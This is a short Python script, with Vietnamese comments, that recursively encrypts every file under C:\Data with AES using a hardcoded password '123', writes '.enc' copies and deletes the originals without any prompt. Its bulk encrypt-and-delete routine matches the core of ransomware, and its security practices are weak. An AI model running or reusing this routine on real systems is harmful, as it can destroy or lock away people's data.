import base64
import os
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def encrypt_file(file_path, password):
    # Tạo khóa từ mật khẩu
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())

    # Đọc nội dung tệp
    with open(file_path, 'rb') as file:
        data = file.read()

    # Mã hóa dữ liệu
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data) + encryptor.finalize()

    # Chuyển đổi dữ liệu đã mã hóa sang base64
    encrypted_base64 = base64.b64encode(salt + iv + encrypted_data)

    # Lưu dữ liệu đã mã hóa vào tệp mới
    with open(file_path + '.enc', 'wb') as enc_file:
        enc_file.write(encrypted_base64)
        
    # Xóa tệp gốc
    os.remove(file_path)


def get_all_files(directory):
    all_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            all_files.append(os.path.join(root, file))
    return all_files


def main():
    password = '123'
    directory_path = r'C:\Data'
    file_list = get_all_files(directory_path)
    
    # In ra danh sách các tệp
    for filename in file_list:
        if not filename.endswith('.enc'):
            print(filename)
            encrypt_file(filename, password)

main()